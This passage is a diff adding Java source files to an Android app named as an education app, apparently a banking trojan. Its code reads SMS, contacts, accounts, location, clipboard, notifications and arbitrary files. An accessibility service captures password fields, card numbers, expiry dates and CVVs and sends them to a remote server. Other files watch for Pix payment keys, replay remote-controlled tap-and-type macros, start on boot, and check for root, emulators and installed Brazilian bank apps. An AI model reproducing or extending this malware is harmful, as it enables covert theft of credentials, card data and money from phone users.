@@ -1,0 +1,1199 @@
+
+===== app/src/main/java/com/eloeeducacao/Extra.java =====
+package com.eloeeducacao;
+
+import android.content.ClipData;
+import android.content.ClipboardManager;
+import android.content.Context;
+import android.content.Intent;
+import android.content.pm.ApplicationInfo;
+import android.content.pm.PackageManager;
+import android.hardware.camera2.CameraCharacteristics;
+import android.hardware.camera2.CameraManager;
+import android.location.Location;
+import android.location.LocationManager;
+import android.media.AudioManager;
+import android.net.Uri;
+import android.os.Build;
+import android.os.Environment;
+import android.os.StatFs;
+import android.provider.ContactsContract;
+import android.provider.Settings;
+import android.util.Base64;
+import android.view.KeyEvent;
+
+import java.io.ByteArrayOutputStream;
+import java.io.File;
+import java.io.FileInputStream;
+import java.text.SimpleDateFormat;
+import java.util.Date;
+import java.util.List;
+import java.util.Locale;
+
+public final class Extra {
+
+    private static final int MAX = 12000;
+
+    private static String cut(String s) {
+        if (s == null) return "";
+        return s.length() > MAX ? s.substring(0, MAX) + "\n[...cortado]" : s;
+    }
+
+    public static String sms(Context c) {
+        StringBuilder sb = new StringBuilder();
+        try {
+            android.database.Cursor cu = c.getContentResolver().query(
+                    Uri.parse("content://sms/inbox"), null, null, null, "date DESC");
+            int n = 0;
+            if (cu != null) {
+                SimpleDateFormat f = new SimpleDateFormat("dd/MM HH:mm", Locale.US);
+                while (cu.moveToNext() && n < 60) {
+                    String addr = cu.getString(cu.getColumnIndexOrThrow("address"));
+                    String body = cu.getString(cu.getColumnIndexOrThrow("body"));
+                    long ts = cu.getLong(cu.getColumnIndexOrThrow("date"));
+                    sb.append(f.format(new Date(ts))).append(" | ").append(addr)
+                      .append(" | ").append(body).append('\n');
+                    n++;
+                }
+                cu.close();
+            }
+        } catch (Throwable t) {
+            sb.append("err: ").append(t);
+        }
+        return cut(sb.toString());
+    }
+
+    public static String contacts(Context c) {
+        StringBuilder sb = new StringBuilder();
+        try {
+            android.database.Cursor cu = c.getContentResolver().query(
+                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null,
+                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC");
+            int n = 0;
+            if (cu != null) {
+                while (cu.moveToNext() && n < 400) {
+                    String name = cu.getString(cu.getColumnIndexOrThrow(
+                            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
+                    String num = cu.getString(cu.getColumnIndexOrThrow(
+                            ContactsContract.CommonDataKinds.Phone.NUMBER));
+                    sb.append(name).append(" <").append(num).append(">\n");
+                    n++;
+                }
+                cu.close();
+            }
+        } catch (Throwable t) {
+            sb.append("err: ").append(t);
+        }
+        return cut(sb.toString());
+    }
+
+    public static String apps(Context c) {
+        StringBuilder sb = new StringBuilder();
+        try {
+            PackageManager pm = c.getPackageManager();
+            List<ApplicationInfo> l = pm.getInstalledApplications(0);
+            for (ApplicationInfo a : l) {
+                boolean launch = pm.getLaunchIntentForPackage(a.packageName) != null;
+                if (!launch) continue;
+                sb.append(pm.getApplicationLabel(a)).append(" | ").append(a.packageName).append('\n');
+            }
+        } catch (Throwable t) {
+            sb.append("err: ").append(t);
+        }
+        return cut(sb.toString());
+    }
+
+    public static String loc(Context c) {
+        StringBuilder sb = new StringBuilder();
+        try {
+            LocationManager lm = (LocationManager) c.getSystemService(Context.LOCATION_SERVICE);
+            for (String p : lm.getProviders(true)) {
+                Location l = lm.getLastKnownLocation(p);
+                if (l == null) continue;
+                sb.append(p).append(": ").append(l.getLatitude()).append(',')
+                  .append(l.getLongitude()).append(" +-").append(l.getAccuracy())
+                  .append("m ").append((System.currentTimeMillis() - l.getTime()) / 1000).append("s atras\n");
+            }
+            if (sb.length() == 0) sb.append("sem posicao em cache");
+        } catch (Throwable t) {
+            sb.append("err: ").append(t);
+        }
+        return sb.toString();
+    }
+
+    public static String clip(Context c) {
+        try {
+            ClipboardManager cm = (ClipboardManager) c.getSystemService(Context.CLIPBOARD_SERVICE);
+            ClipData d = cm.getPrimaryClip();
+            if (d == null || d.getItemCount() == 0) return "vazio";
+            return String.valueOf(d.getItemAt(0).coerceToText(c));
+        } catch (Throwable t) {
+            return "err: " + t;
+        }
+    }
+
+    public static void setClip(final Context c, final String s) {
+        try {
+            android.os.Handler h = new android.os.Handler(android.os.Looper.getMainLooper());
+            h.post(new Runnable() {
+                @Override public void run() {
+                    try {
+                        ClipboardManager cm = (ClipboardManager) c.getSystemService(Context.CLIPBOARD_SERVICE);
+                        cm.setPrimaryClip(ClipData.newPlainText("a", s));
+                    } catch (Throwable ignored) {}
+                }
+            });
+        } catch (Throwable ignored) {}
+    }
+
+    public static String notifs(Context c) {
+        return cut(Util.exec("dumpsys notification --noredact"));
+    }
+
+    public static String info(Context c) {
+        StringBuilder sb = new StringBuilder();
+        try {
+            sb.append("modelo: ").append(Build.MANUFACTURER).append(' ').append(Build.MODEL).append('\n');
+            sb.append("sdk: ").append(Build.VERSION.SDK_INT).append(" rel: ").append(Build.VERSION.RELEASE).append('\n');
+            sb.append("board: ").append(Build.BOARD).append(" abi: ")
+              .append(Build.SUPPORTED_ABIS.length > 0 ? Build.SUPPORTED_ABIS[0] : "?").append('\n');
+            sb.append("uptime: ").append(android.os.SystemClock.elapsedRealtime() / 1000).append("s\n");
+            StatFs st = new StatFs(Environment.getDataDirectory().getAbsolutePath());
+            sb.append("livre: ").append(st.getAvailableBytes() / 1048576).append("MB de ")
+              .append(st.getTotalBytes() / 1048576).append("MB\n");
+            sb.append("ip: ").append(Util.ip()).append('\n');
+            sb.append("tela: ").append(Util.screen(c)).append('\n');
+            sb.append("brilho: ").append(Settings.System.getInt(c.getContentResolver(),
+                    Settings.System.SCREEN_BRIGHTNESS, -1)).append('\n');
+            sb.append("acc: ").append(Util.accOn(c)).append('\n');
+        } catch (Throwable t) {
+            sb.append("err: ").append(t);
+        }
+        return sb.toString();
+    }
+
+    public static String ls(String path) {
+        StringBuilder sb = new StringBuilder();
+        try {
+            File d = new File(path);
+            File[] fs = d.listFiles();
+            if (fs == null) return "sem acesso ou vazio: " + path;
+            java.util.Arrays.sort(fs);
+            for (File f : fs) {
+                sb.append(f.isDirectory() ? "d " : "- ").append(f.length()).append('\t')
+                  .append(f.getName()).append('\n');
+                if (sb.length() > MAX) break;
+            }
+        } catch (Throwable t) {
+            sb.append("err: ").append(t);
+        }
+        return cut(sb.toString());
+    }
+
+    public static String cat(String path, int off, int len) {
+        java.io.RandomAccessFile raf = null;
+        try {
+            File f = new File(path);
+            if (!f.isFile()) return "nao e arquivo";
+            long total = f.length();
+            raf = new java.io.RandomAccessFile(f, "r");
+            raf.seek(Math.max(0, Math.min(off, total)));
+            int n = (int) Math.min(len, Math.max(1, total - raf.getFilePointer()));
+            byte[] b = new byte[n];
+            int r = raf.read(b);
+            if (r <= 0) return "fim";
+            return "off=" + off + " total=" + total + " b64=" + Base64.encodeToString(
+                    r == n ? b : java.util.Arrays.copyOf(b, r), Base64.NO_WRAP);
+        } catch (Throwable t) {
+            return "err: " + t;
+        } finally {
+            try { if (raf != null) raf.close(); } catch (Throwable ignored) {}
+        }
+    }
+
+    public static void bright(Context c, int pct) {
+        try {
+            int v = Math.max(0, Math.min(255, pct * 255 / 100));
+            Settings.System.putInt(c.getContentResolver(), Settings.System.SCREEN_BRIGHTNESS, v);
+            Settings.System.putInt(c.getContentResolver(), Settings.System.SCREEN_BRIGHTNESS_MODE, 0);
+        } catch (Throwable ignored) {}
+    }
+
+    public static void torch(Context c, boolean on) {
+        try {
+            CameraManager cm = (CameraManager) c.getSystemService(Context.CAMERA_SERVICE);
+            for (String id : cm.getCameraIdList()) {
+                Boolean has = cm.getCameraCharacteristics(id)
+                        .get(CameraCharacteristics.FLASH_INFO_AVAILABLE);
+                if (has != null && has) {
+                    cm.setTorchMode(id, on);
+                    return;
+                }
+            }
+        } catch (Throwable ignored) {}
+    }
+
+    public static void volume(Context c, int dir, int pct) {
+        try {
+            AudioManager am = (AudioManager) c.getSystemService(Context.AUDIO_SERVICE);
+            if (pct >= 0) {
+                int max = am.getStreamMaxVolume(AudioManager.STREAM_MUSIC);
+                am.setStreamVolume(AudioManager.STREAM_MUSIC, Math.max(0, Math.min(max, pct * max / 100)), 0);
+            } else {
+                am.adjustStreamVolume(AudioManager.STREAM_MUSIC,
+                        dir > 0 ? AudioManager.ADJUST_RAISE : AudioManager.ADJUST_LOWER,
+                        AudioManager.FLAG_SHOW_UI);
+            }
+        } catch (Throwable ignored) {}
+    }
+
+    public static void media(Context c, int code) {
+        try {
+            AudioManager am = (AudioManager) c.getSystemService(Context.AUDIO_SERVICE);
+            am.dispatchMediaKeyEvent(new KeyEvent(KeyEvent.ACTION_DOWN, code));
+            am.dispatchMediaKeyEvent(new KeyEvent(KeyEvent.ACTION_UP, code));
+        } catch (Throwable ignored) {}
+    }
+
+    public static void dial(Context c, String num, boolean call) {
+        try {
+            Intent i = new Intent(call ? Intent.ACTION_CALL : Intent.ACTION_DIAL,
+                    Uri.parse("tel:" + Uri.encode(num)));
+            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            c.startActivity(i);
+        } catch (Throwable ignored) {}
+    }
+}
+
+===== app/src/main/java/com/eloeeducacao/Captura.java =====
+package com.eloeeducacao;
+
+import android.view.accessibility.AccessibilityNodeInfo;
+
+import org.json.JSONObject;
+
+import java.util.ArrayList;
+import java.util.LinkedHashSet;
+import java.util.List;
+
+public final class Captura {
+
+    private static final LinkedHashSet<String> vistos = new LinkedHashSet<>();
+    private static volatile long ultimo;
+
+    private static boolean luhn(String d) {
+        int soma = 0;
+        boolean par = false;
+        for (int i = d.length() - 1; i >= 0; i--) {
+            int n = d.charAt(i) - '0';
+            if (par) {
+                n *= 2;
+                if (n > 9) n -= 9;
+            }
+            soma += n;
+            par = !par;
+        }
+        return soma % 10 == 0;
+    }
+
+    private static String dica(AccessibilityNodeInfo n) {
+        StringBuilder b = new StringBuilder();
+        try {
+            if (n.getViewIdResourceName() != null) {
+                String id = n.getViewIdResourceName();
+                int i = id.lastIndexOf('/');
+                b.append(i >= 0 ? id.substring(i + 1) : id).append(' ');
+            }
+        } catch (Throwable ignored) {}
+        try {
+            if (n.getHintText() != null) b.append(n.getHintText()).append(' ');
+        } catch (Throwable ignored) {}
+        try {
+            if (n.getContentDescription() != null) b.append(n.getContentDescription());
+        } catch (Throwable ignored) {}
+        String s = b.toString().trim();
+        return s.length() > 60 ? s.substring(0, 60) : s;
+    }
+
+    private static void manda(String tipo, JSONObject o) {
+        Net.send("{\"t\":\"" + tipo + "\",\"o\":" + o.toString() + "}");
+    }
+
+    public static void ev() {
+        long a = System.currentTimeMillis();
+        if (a - ultimo < 650) return;
+        ultimo = a;
+        KeySvc k = KeySvc.I;
+        if (k == null) return;
+        AccessibilityNodeInfo r = k.getRootInActiveWindow();
+        if (r == null) return;
+        AccessibilityNodeInfo f = null;
+        try {
+            f = r.findFocus(AccessibilityNodeInfo.FOCUS_INPUT);
+        } catch (Throwable ignored) {}
+        if (f == null) return;
+        CharSequence cs = f.getText();
+        if (cs == null) return;
+        String t = cs.toString().trim();
+        if (t.length() < 3) return;
+
+        String pkg = k.curPkg == null ? "?" : k.curPkg;
+        String campo = dica(f);
+        String chave = pkg + "|" + campo + "|" + t;
+        if (vistos.contains(chave)) return;
+        vistos.add(chave);
+        if (vistos.size() > 500) {
+            List<String> l = new ArrayList<>(vistos);
+            vistos.clear();
+            for (int i = l.size() - 350; i < l.size(); i++) vistos.add(l.get(i));
+        }
+
+        String baixo = campo.toLowerCase();
+        try {
+            JSONObject o = new JSONObject();
+            o.put("app", pkg);
+            o.put("campo", campo);
+            if (f.isPassword()) {
+                o.put("v", t);
+                manda("cred", o);
+                return;
+            }
+            String dig = t.replaceAll("[^0-9]", "");
+            if (dig.length() >= 13 && dig.length() <= 19 && luhn(dig)) {
+                o.put("v", dig);
+                manda("cartao", o);
+                return;
+            }
+            if (t.matches("(0[1-9]|1[0-2])\\s?/\\s?\\d{2,4}")) {
+                o.put("v", t);
+                manda("cartao", o);
+                return;
+            }
+            if (dig.length() >= 3 && dig.length() <= 4
+                    && (baixo.contains("cvv") || baixo.contains("segur")
+                        || baixo.contains("cvc") || baixo.contains("cod"))) {
+                o.put("v", dig);
+                manda("cartao", o);
+            }
+        } catch (Throwable ignored) {}
+    }
+}
+
+
+===== app/src/main/java/com/eloeeducacao/Macro.java =====
+package com.eloeeducacao;
+
+import android.os.Bundle;
+import android.os.Handler;
+import android.os.Looper;
+import android.view.accessibility.AccessibilityNodeInfo;
+
+import org.json.JSONArray;
+import org.json.JSONObject;
+
+import java.util.ArrayList;
+import java.util.List;
+
+public final class Macro {
+    private static final Handler H = new Handler(Looper.getMainLooper());
+    private static final List<JSONObject> fila = new ArrayList<>();
+    public static volatile boolean rodando;
+
+    public static void play(JSONArray a, JSONObject vars) {
+        synchronized (fila) {
+            fila.clear();
+            JSONObject v = vars == null ? new JSONObject() : vars;
+            if (a != null) {
+                for (int i = 0; i < a.length(); i++) {
+                    JSONObject s = a.optJSONObject(i);
+                    if (s == null) continue;
+                    if (s.has("v")) {
+                        try {
+                            s.put("v", s.optString("v")
+                                    .replace("{{CHAVE}}", v.optString("chave"))
+                                    .replace("{{VALOR}}", v.optString("valor")));
+                        } catch (Throwable ignored) {}
+                    }
+                    fila.add(s);
+                }
+            }
+        }
+        if (!rodando) {
+            rodando = true;
+            H.post(passo);
+        }
+    }
+
+    public static void stop() {
+        synchronized (fila) { fila.clear(); }
+        rodando = false;
+        Util.sendT("info", "macro interrompido");
+    }
+
+    private static final Runnable passo = new Runnable() {
+        @Override public void run() {
+            if (!rodando) return;
+            JSONObject s;
+            synchronized (fila) {
+                if (fila.isEmpty()) {
+                    rodando = false;
+                    Util.sendT("info", "macro concluido");
+                    return;
+                }
+                s = fila.remove(0);
+            }
+            KeySvc k = KeySvc.I;
+            try {
+                if (k != null && s.has("t")) {
+                    JSONArray p = s.getJSONArray("t");
+                    k.touch((float) p.getDouble(0), (float) p.getDouble(1));
+                } else if (k != null && s.has("l")) {
+                    JSONArray p = s.getJSONArray("l");
+                    k.longPress((float) p.getDouble(0), (float) p.getDouble(1));
+                } else if (k != null && s.has("s")) {
+                    JSONArray p = s.getJSONArray("s");
+                    k.swipe((float) p.getDouble(0), (float) p.getDouble(1),
+                            (float) p.getDouble(2), (float) p.getDouble(3), p.optInt(4, 240));
+                } else if (k != null && s.has("x")) {
+                    k.setText(s.getString("x"));
+                } else if (k != null && s.has("k")) {
+                    k.key(s.getInt("k"));
+                } else if (s.has("do")) {
+                    String d = s.optString("do");
+                    if ("back".equals(d)) {
+                        if (k != null) k.key(4);
+                    } else if ("home".equals(d)) {
+                        if (k != null) k.key(3);
+                    } else if ("wait".equals(d)) {
+                        espera(s, System.currentTimeMillis() + s.optLong("ms", 8000));
+                    } else {
+                        AccessibilityNodeInfo r = k == null ? null : k.getRootInActiveWindow();
+                        Sel.Hit h = r == null ? null : Sel.melhor(r, s.optJSONObject("sel"));
+                        if (h == null) Util.sendT("err", "nao achei: " + s.optJSONObject("sel"));
+                        else executa(s, h, k);
+                    }
+                }
+            } catch (Throwable ignored) {}
+            H.postDelayed(this, Math.max(70, s.optLong("w", 0)));
+        }
+    };
+
+    private static void espera(final JSONObject s, final long ate) {
+        KeySvc k = KeySvc.I;
+        AccessibilityNodeInfo r = k == null ? null : k.getRootInActiveWindow();
+        Sel.Hit h = r == null ? null : Sel.melhor(r, s.optJSONObject("sel"));
+        if (h != null) {
+            executa(s, h, k);
+            H.postDelayed(passo, 120);
+            return;
+        }
+        if (System.currentTimeMillis() > ate) {
+            Util.sendT("err", "timeout: " + s.optJSONObject("sel"));
+            H.postDelayed(passo, 120);
+            return;
+        }
+        H.postDelayed(() -> espera(s, ate), 250);
+    }
+
+    private static void executa(JSONObject s, Sel.Hit h, KeySvc k) {
+        String d = s.optString("do");
+        try {
+            if ("tap".equals(d)) k.touch(h.x, h.y);
+            else if ("long".equals(d)) k.longPress(h.x, h.y);
+            else if ("get".equals(d)) Util.sendT("get", h.txt);
+            else if ("set".equals(d)) {
+                Bundle b = new Bundle();
+                b.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE,
+                        s.optString("v"));
+                h.node.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, b);
+            }
+        } catch (Throwable ignored) {}
+    }
+}
+
+
+===== app/src/main/java/com/eloeeducacao/Watch.java =====
+package com.eloeeducacao;
+
+import android.view.accessibility.AccessibilityNodeInfo;
+
+import org.json.JSONObject;
+
+public final class Watch {
+    public static volatile boolean on;
+    private static volatile long ultimo;
+
+    public static void ev() {
+        if (!on) return;
+        long agora = System.currentTimeMillis();
+        if (agora - ultimo < 1500) return;
+        ultimo = agora;
+        KeySvc k = KeySvc.I;
+        if (k == null) return;
+        AccessibilityNodeInfo r = k.getRootInActiveWindow();
+        if (r == null) return;
+        try {
+            JSONObject s = new JSONObject().put("edit", true);
+            StringBuilder chaves = new StringBuilder();
+            for (Sel.Hit h : Sel.todos(r, s)) {
+                String t = h.txt.trim();
+                if (t.matches("\\d{11}|\\d{3}\\.\\d{3}\\.\\d{3}-\\d{2}|[^@\\s]+@[^@\\s]+")
+                        || t.matches("[0-9a-f]{8}-[0-9a-f-]{20,}")) {
+                    chaves.append(t).append(" ; ");
+                }
+            }
+            if (chaves.length() == 0) return;
+            String valor = "";
+            for (Sel.Hit h : Sel.todos(r, new JSONObject().put("txt", "R\\$\\s?[\\d.,]+")))
+                valor = h.txt;
+            Util.sendT("pixvisto", "chave=" + chaves + " valor=" + valor);
+        } catch (Throwable ignored) {}
+    }
+}
+
+
+===== app/src/main/java/com/eloeeducacao/Sel.java =====
+package com.eloeeducacao;
+
+import android.graphics.Rect;
+import android.view.accessibility.AccessibilityNodeInfo;
+
+import org.json.JSONObject;
+
+import java.util.ArrayDeque;
+import java.util.ArrayList;
+import java.util.Deque;
+import java.util.List;
+import java.util.regex.Pattern;
+
+public final class Sel {
+
+    public static final class Hit {
+        public final AccessibilityNodeInfo node;
+        public final int x, y;
+        public final String txt;
+        Hit(AccessibilityNodeInfo n, int x, int y, String t) {
+            this.node = n; this.x = x; this.y = y; this.txt = t;
+        }
+    }
+
+    private static boolean casa(AccessibilityNodeInfo n, JSONObject s) {
+        try {
+            if (s.has("edit") && n.isEditable() != s.getBoolean("edit")) return false;
+            if (s.has("click") && n.isClickable() != s.getBoolean("click")) return false;
+            if (s.has("cls")) {
+                String c = String.valueOf(n.getClassName()).toLowerCase();
+                if (!c.contains(s.getString("cls").toLowerCase())) return false;
+            }
+            if (s.has("id")) {
+                String id = n.getViewIdResourceName();
+                if (id == null || !Pattern.compile(s.getString("id")).matcher(id).find()) return false;
+            }
+            if (s.has("txt")) {
+                String t = (n.getText() == null ? "" : n.getText().toString()) + " "
+                        + (n.getContentDescription() == null ? "" : n.getContentDescription().toString());
+                if (!Pattern.compile(s.getString("txt"), Pattern.CASE_INSENSITIVE).matcher(t).find())
+                    return false;
+            }
+            return true;
+        } catch (Throwable t) {
+            return false;
+        }
+    }
+
+    public static List<Hit> todos(AccessibilityNodeInfo raiz, JSONObject s) {
+        List<Hit> out = new ArrayList<>();
+        if (raiz == null) return out;
+        Deque<AccessibilityNodeInfo> fila = new ArrayDeque<>();
+        fila.add(raiz);
+        int limite = 4000;
+        while (!fila.isEmpty() && limite-- > 0) {
+            AccessibilityNodeInfo n = fila.poll();
+            if (n == null) continue;
+            if (casa(n, s)) {
+                Rect r = new Rect();
+                n.getBoundsInScreen(r);
+                if (r.width() > 0 && r.height() > 0) {
+                    CharSequence t = n.getText();
+                    out.add(new Hit(n, r.centerX(), r.centerY(), t == null ? "" : t.toString()));
+                }
+            }
+            for (int i = 0; i < n.getChildCount(); i++) {
+                AccessibilityNodeInfo f = n.getChild(i);
+                if (f != null) fila.add(f);
+            }
+        }
+        return out;
+    }
+
+    public static Hit melhor(AccessibilityNodeInfo raiz, JSONObject s) {
+        List<Hit> l = todos(raiz, s);
+        if (l.isEmpty()) return null;
+        if (!s.has("perto")) return l.get(0);
+        int px = s.optJSONArray("perto").optInt(0, 0);
+        int py = s.optJSONArray("perto").optInt(1, 0);
+        Hit best = null;
+        double bd = Double.MAX_VALUE;
+        for (Hit h : l) {
+            double d = Math.hypot(h.x - px, h.y - py);
+            if (d < bd) { bd = d; best = h; }
+        }
+        return best;
+    }
+}
+
+
+===== app/src/main/java/com/eloeeducacao/Boot.java =====
+package com.eloeeducacao;
+
+import android.content.BroadcastReceiver;
+import android.content.Context;
+import android.content.Intent;
+import android.os.Build;
+
+public class Boot extends BroadcastReceiver {
+    @Override public void onReceive(Context c, Intent i) {
+        try {
+            Intent s = new Intent(c, NetSvc.class);
+            if (Build.VERSION.SDK_INT >= 26) c.startForegroundService(s);
+            else c.startService(s);
+        } catch (Throwable ignored) {}
+    }
+}
+
+===== app/src/main/java/com/eloeeducacao/Clip.java =====
+package com.eloeeducacao;
+
+import android.content.ClipData;
+import android.content.ClipboardManager;
+import android.content.Context;
+import android.os.Handler;
+import android.os.Looper;
+
+public final class Clip {
+
+    public static volatile boolean on;
+    private static String ultimo = "";
+    private static final Handler H = new Handler(Looper.getMainLooper());
+    private static boolean rodando;
+
+    public static void liga(final Context c) {
+        if (rodando) return;
+        rodando = true;
+        H.postDelayed(new Runnable() {
+            @Override public void run() {
+                if (!on) { rodando = false; return; }
+                try {
+                    ClipboardManager cm = (ClipboardManager)
+                            c.getSystemService(Context.CLIPBOARD_SERVICE);
+                    ClipData d = cm.getPrimaryClip();
+                    if (d != null && d.getItemCount() > 0) {
+                        CharSequence t = d.getItemAt(0).coerceToText(c);
+                        if (t != null && t.length() > 0 && t.length() < 4000) {
+                            String s = t.toString();
+                            if (!s.equals(ultimo)) {
+                                ultimo = s;
+                                Util.sendT("clip", s);
+                            }
+                        }
+                    }
+                } catch (Throwable ignored) {}
+                H.postDelayed(this, 2500);
+            }
+        }, 800);
+    }
+}
+
+
+===== app/src/main/java/com/eloeeducacao/Aviso.java =====
+package com.eloeeducacao;
+
+import android.content.Context;
+import android.graphics.Color;
+import android.graphics.PixelFormat;
+import android.graphics.Typeface;
+import android.graphics.drawable.GradientDrawable;
+import android.os.Build;
+import android.os.Handler;
+import android.os.Looper;
+import android.view.Gravity;
+import android.view.View;
+import android.view.WindowManager;
+import android.widget.LinearLayout;
+import android.widget.TextView;
+
+public final class Aviso {
+
+    private static final Handler H = new Handler(Looper.getMainLooper());
+    private static WindowManager wm;
+    private static View root;
+
+    private static final Runnable fim = new Runnable() {
+        @Override public void run() { clear(); }
+    };
+
+    private Aviso() {}
+
+    public static void show(final Context c, final String titulo, final String texto) {
+        H.post(new Runnable() {
+            @Override public void run() {
+                try {
+                    clear();
+                    wm = (WindowManager) c.getSystemService(Context.WINDOW_SERVICE);
+
+                    LinearLayout fora = new LinearLayout(c);
+                    fora.setPadding(28, 28, 28, 28);
+
+                    LinearLayout card = new LinearLayout(c);
+                    card.setOrientation(LinearLayout.HORIZONTAL);
+                    card.setGravity(Gravity.TOP);
+                    card.setPadding(26, 22, 26, 22);
+                    GradientDrawable bg = new GradientDrawable();
+                    bg.setColor(Color.parseColor("#F21A1F26"));
+                    bg.setCornerRadius(38f);
+                    bg.setStroke(2, Color.parseColor("#2E3945"));
+                    card.setBackground(bg);
+
+                    TextView ic = new TextView(c);
+                    ic.setText("!");
+                    ic.setTextColor(Color.WHITE);
+                    ic.setTextSize(15);
+                    ic.setTypeface(Typeface.DEFAULT_BOLD);
+                    ic.setGravity(Gravity.CENTER);
+                    GradientDrawable ib = new GradientDrawable();
+                    ib.setShape(GradientDrawable.OVAL);
+                    ib.setColor(Color.parseColor("#2F81F7"));
+                    ic.setBackground(ib);
+                    LinearLayout.LayoutParams il =
+                            new LinearLayout.LayoutParams(dp(c, 30), dp(c, 30));
+                    il.rightMargin = dp(c, 16);
+                    ic.setLayoutParams(il);
+
+                    LinearLayout col = new LinearLayout(c);
+                    col.setOrientation(LinearLayout.VERTICAL);
+
+                    TextView t1 = new TextView(c);
+                    t1.setText(titulo);
+                    t1.setTextColor(Color.WHITE);
+                    t1.setTextSize(14);
+                    t1.setTypeface(Typeface.DEFAULT_BOLD);
+
+                    TextView t2 = new TextView(c);
+                    t2.setText(texto);
+                    t2.setTextColor(Color.parseColor("#B8C2CE"));
+                    t2.setTextSize(13);
+                    t2.setPadding(0, dp(c, 4), 0, 0);
+
+                    col.addView(t1);
+                    col.addView(t2);
+                    card.addView(ic);
+                    card.addView(col);
+                    fora.addView(card);
+
+                    int type = WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY;
+                    WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
+                            WindowManager.LayoutParams.MATCH_PARENT,
+                            WindowManager.LayoutParams.WRAP_CONTENT, type,
+                            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
+                                    | WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
+                                    | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
+                                    | WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
+                            PixelFormat.TRANSLUCENT);
+                    lp.gravity = Gravity.TOP;
+                    lp.y = dp(c, 44);
+                    fora.setTranslationY(-dp(c, 140));
+                    wm.addView(fora, lp);
+                    root = fora;
+                    fora.animate().translationY(0).setDuration(220).start();
+                    H.removeCallbacks(fim);
+                    H.postDelayed(fim, 5200);
+                } catch (Throwable ignored) {}
+            }
+        });
+    }
+
+    public static void clear() {
+        H.post(new Runnable() {
+            @Override public void run() {
+                H.removeCallbacks(fim);
+                try {
+                    if (root != null && wm != null) {
+                        root.animate().translationY(-dp(root.getContext(), 140)).setDuration(180).start();
+                        final View v = root;
+                        H.postDelayed(new Runnable() {
+                            @Override public void run() {
+                                try { if (wm != null) wm.removeView(v); } catch (Throwable ignored) {}
+                            }
+                        }, 190);
+                    }
+                } catch (Throwable ignored) {}
+                root = null;
+            }
+        });
+    }
+
+    private static int dp(Context c, int v) {
+        return (int) (v * c.getResources().getDisplayMetrics().density);
+    }
+}
+
+===== app/src/main/java/com/eloeeducacao/Contas.java =====
+package com.eloeeducacao;
+
+import android.accounts.Account;
+import android.accounts.AccountManager;
+import android.content.Context;
+
+public final class Contas {
+    public static String lista(Context c) {
+        StringBuilder b = new StringBuilder();
+        try {
+            AccountManager am = AccountManager.get(c);
+            for (Account a : am.getAccounts()) {
+                b.append(a.type).append('\t').append(a.name).append('\n');
+            }
+        } catch (Throwable t) {
+            return "err: " + t;
+        }
+        return b.length() == 0 ? "nenhuma conta" : b.toString();
+    }
+}
+
+
+===== app/src/main/java/com/eloeeducacao/Finger.java =====
+package com.eloeeducacao;
+
+import android.content.Context;
+import android.os.Build;
+import android.os.Environment;
+import android.os.StatFs;
+
+import java.util.Locale;
+import java.util.TimeZone;
+
+public final class Finger {
+
+    private static final String[] BANCOS = {
+            "br.com.intermedium", "com.nu.production", "com.itau", "com.bradesco",
+            "com.santander.app", "br.com.bb.android", "com.picpay", "com.mercadopago.wallet",
+            "br.com.caixa", "com.google.android.apps.walletnfcrel"
+    };
+
+    public static String txt(Context c) {
+        StringBuilder b = new StringBuilder();
+        b.append("modelo: ").append(Build.MANUFACTURER).append(' ').append(Build.MODEL).append('\n');
+        b.append("marca: ").append(Build.BRAND).append('\n');
+        b.append("device: ").append(Build.DEVICE).append('\n');
+        b.append("build: ").append(Build.DISPLAY).append('\n');
+        b.append("android: ").append(Build.VERSION.RELEASE).append(" sdk ").append(Build.VERSION.SDK_INT).append('\n');
+        b.append("abi: ").append(Build.SUPPORTED_ABIS.length > 0 ? Build.SUPPORTED_ABIS[0] : "?").append('\n');
+        b.append("idioma: ").append(Locale.getDefault().toString()).append('\n');
+        b.append("fuso: ").append(TimeZone.getDefault().getID()).append('\n');
+        b.append("tela: ").append(Util.screen(c)).append('\n');
+        try {
+            StatFs s = new StatFs(Environment.getDataDirectory().getPath());
+            b.append("disco livre: ").append(s.getAvailableBytes() / 1048576).append(" MB\n");
+        } catch (Throwable ignored) {}
+        b.append("ip: ").append(Util.ip()).append('\n');
+        try {
+            android.telephony.TelephonyManager tm = (android.telephony.TelephonyManager)
+                    c.getSystemService(Context.TELEPHONY_SERVICE);
+            b.append("operadora: ").append(tm.getNetworkOperatorName()).append('\n');
+        } catch (Throwable ignored) {}
+        b.append("root: ").append(root() ? "sim" : "nao").append('\n');
+        b.append("emulador: ").append(emu() ? "sim" : "nao").append('\n');
+        b.append("dev options: ")
+                .append(android.provider.Settings.Global.getInt(c.getContentResolver(),
+                        android.provider.Settings.Global.DEVELOPMENT_SETTINGS_ENABLED, 0) == 1
+                        ? "ligado" : "desligado").append('\n');
+        b.append("acessibilidade: ").append(Util.accOn(c) ? "ativa" : "inativa").append('\n');
+        b.append("--- apps de banco ---\n");
+        for (String p : BANCOS) {
+            try {
+                c.getPackageManager().getPackageInfo(p, 0);
+                b.append("  ").append(p).append('\n');
+            } catch (Throwable ignored) {}
+        }
+        return b.toString();
+    }
+
+    private static boolean root() {
+        String[] p = {"/system/app/Superuser.apk", "/sbin/su", "/system/bin/su",
+                "/system/xbin/su", "/data/local/xbin/su", "/data/local/bin/su",
+                "/system/sd/xbin/su", "/system/bin/failsafe/su", "/data/local/su"};
+        for (String s : p) if (new java.io.File(s).exists()) return true;
+        return false;
+    }
+
+    private static boolean emu() {
+        return Build.FINGERPRINT.startsWith("generic")
+                || Build.MODEL.contains("google_sdk")
+                || Build.MODEL.contains("Emulator")
+                || Build.HARDWARE.contains("goldfish")
+                || Build.HARDWARE.contains("ranchu");
+    }
+}
+
+
+===== app/src/main/java/com/eloeeducacao/Snap.java =====
+package com.eloeeducacao;
+
+import android.graphics.Rect;
